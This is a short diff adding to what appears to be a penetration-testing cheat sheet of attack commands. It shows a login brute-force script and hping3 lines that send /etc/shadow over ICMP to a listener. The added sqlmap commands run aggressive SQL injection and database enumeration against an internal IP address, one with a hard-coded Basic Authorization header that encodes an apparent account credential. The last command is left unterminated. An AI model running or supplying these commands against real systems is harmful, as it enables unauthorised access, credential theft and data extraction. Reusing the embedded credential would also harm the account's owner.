@@ -575,3 +575,7 @@ python3 jsonbrute.py --url http://management.test.local/api/login --wordlist roc
 /usr/sbin/hping3 -1 127.0.0.1 -e signature -E /etc/shadow -d 500
 # listener
 /usr/sbin/hping3 -1 127.0.0.1 -9 signature -I lo
+
+[sqlmap]
+sqlmap -u 'http://10.10.110.124/login.php?username=admin&password=admin' --dbs --batch --level 4 --risk 3
+sqlmap -u 'http://10.10.110.124/login' --form --dbs --batch --level 4 --risk 3 --headers="Authorization: Basic c3ZjX2lpczpWaW50YWdlIQ==
